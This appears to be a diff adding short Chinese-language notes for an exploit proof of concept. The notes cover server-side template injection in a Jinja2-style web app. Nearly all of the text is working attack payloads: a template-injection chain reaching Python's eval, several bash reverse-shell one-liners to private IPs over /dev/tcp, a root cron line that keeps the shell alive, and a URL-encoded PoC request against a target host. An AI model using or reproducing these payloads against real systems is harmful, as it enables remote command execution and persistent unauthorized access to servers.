@@ -1,0 +1,42 @@
+实现:运行poc.py
+输入监听的ip和port
+输入访问的ip和port
+监听端口
+nc -v -l -o-p ip port
+
+反弹成功
+
+
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("bash -c 'sh -i &>/dev/tcp/192.168.6.25/1234 0>&1'").read()') }}
+
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+
+
+*/1 * * * * root bash -c 'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1
+
+bash -i > /dev/tcp/192.168.2.141/8080 
+
+eval('__import__("os").popen("bash -c \'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1\'").read()')
+
+poc:
+
+http://192.168.2.246:8000/?name=%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__%28%29+%25%7D%0A%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%0A++%7B%25+for+b+in+c.__init__.__globals__.values%28%29+%25%7D%0A++%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%0A++++%7B%25+if+%27eval%27+in+b.keys%28%29+%25%7D%0A++++++%7B%7B+b%5B%27eval%27%5D%28%27__import__%28%22os%22%29.popen%28%22bash+-c+%5C%27sh+-i+%26%3E%2Fdev%2Ftcp%2F192.168.2.141%2F8080+0%3E%261%5C%27%22%29.read%28%29%27%29+%7D%7D%0A++++%7B%25+endif+%25%7D%0A++%7B%25+endif+%25%7D%0A++%7B%25+endfor+%25%7D%0A%7B%25+endif+%25%7D%0A%7B%25+endfor+%25%7D
+
+
+反弹shell：将id改为
+1.	eval('__import__("os").popen("bash -c \'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1\'").read()')
+	bash -c \'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1\'
+2.	eval("__import__('os').popen('bash -c \\'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1\\'').read()")
+	bash -c \\'sh -i &>/dev/tcp/192.168.2.141/8080 0>&1\\'
+
+在本地监听
+
